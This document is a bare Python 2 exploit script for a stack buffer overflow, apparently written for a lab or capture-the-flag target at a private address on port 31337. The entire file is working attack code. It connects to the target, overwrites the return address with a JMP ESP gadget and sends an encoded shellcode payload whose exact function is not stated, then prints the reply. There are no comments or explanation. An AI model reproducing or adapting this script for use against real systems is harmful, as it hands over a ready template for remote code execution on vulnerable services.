#!/usr/bin/python

import socket
import struct

RHOST = "192.168.56.101"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

jmp_esp = 0x080414c3
esp_space = "\x83\xec\x10"

shellcode =  ""
shellcode += "\xdb\xda\xba\xb8\xba\xd6\x27\xd9\x74\x24\xf4\x58"
shellcode += "\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\xe8"
shellcode += "\xa9\x34\xd2\xf4\x26\x3a\x1d\x04\xb7\x5b\x97\xe1"
shellcode += "\x86\x5b\xc3\x62\xb8\x6b\x87\x26\x35\x07\xc5\xd2"
shellcode += "\xce\x65\xc2\xd5\x67\xc3\x34\xd8\x78\x78\x04\x7b"
shellcode += "\xfb\x83\x59\x5b\xc2\x4b\xac\x9a\x03\xb1\x5d\xce"
shellcode += "\xdc\xbd\xf0\xfe\x69\x8b\xc8\x75\x21\x1d\x49\x6a"
shellcode += "\xf2\x1c\x78\x3d\x88\x46\x5a\xbc\x5d\xf3\xd3\xa6"
shellcode += "\x82\x3e\xad\x5d\x70\xb4\x2c\xb7\x48\x35\x82\xf6"
shellcode += "\x64\xc4\xda\x3f\x42\x37\xa9\x49\xb0\xca\xaa\x8e"
shellcode += "\xca\x10\x3e\x14\x6c\xd2\x98\xf0\x8c\x37\x7e\x73"
shellcode += "\x82\xfc\xf4\xdb\x87\x03\xd8\x50\xb3\x88\xdf\xb6"
shellcode += "\x35\xca\xfb\x12\x1d\x88\x62\x03\xfb\x7f\x9a\x53"
shellcode += "\xa4\x20\x3e\x18\x49\x34\x33\x43\x06\xf9\x7e\x7b"
shellcode += "\xd6\x95\x09\x08\xe4\x3a\xa2\x86\x44\xb2\x6c\x51"
shellcode += "\xaa\xe9\xc9\xcd\x55\x12\x2a\xc4\x91\x46\x7a\x7e"
shellcode += "\x33\xe7\x11\x7e\xbc\x32\xb5\x2e\x12\xed\x76\x9e"
shellcode += "\xd2\x5d\x1f\xf4\xdc\x82\x3f\xf7\x36\xab\xaa\x02"
shellcode += "\xd1\x14\x82\x34\xe6\xfd\xd1\x44\xf9\xa1\x5c\xa2"
shellcode += "\x93\x49\x09\x7d\x0c\xf3\x10\xf5\xad\xfc\x8e\x70"
shellcode += "\xed\x77\x3d\x85\xa0\x7f\x48\x95\x55\x70\x07\xc7"
shellcode += "\xf0\x8f\xbd\x6f\x9e\x02\x5a\x6f\xe9\x3e\xf5\x38"
shellcode += "\xbe\xf1\x0c\xac\x52\xab\xa6\xd2\xae\x2d\x80\x56"
shellcode += "\x75\x8e\x0f\x57\xf8\xaa\x2b\x47\xc4\x33\x70\x33"
shellcode += "\x98\x65\x2e\xed\x5e\xdc\x80\x47\x09\xb3\x4a\x0f"
shellcode += "\xcc\xff\x4c\x49\xd1\xd5\x3a\xb5\x60\x80\x7a\xca"
shellcode += "\x4d\x44\x8b\xb3\xb3\xf4\x74\x6e\x70\x14\x97\xba"
shellcode += "\x8d\xbd\x0e\x2f\x2c\xa0\xb0\x9a\x73\xdd\x32\x2e"
shellcode += "\x0c\x1a\x2a\x5b\x09\x66\xec\xb0\x63\xf7\x99\xb6"
shellcode += "\xd0\xf8\x8b"

buf = ""
buf += "A"*146
buf += struct.pack("<I", jmp_esp)
buf += esp_space
buf += shellcode
buf += "\n"

s.send(buf)

print "Sent: {0}".format(buf)

data = s.recv(1024)

print "Received: {0}".format(data)
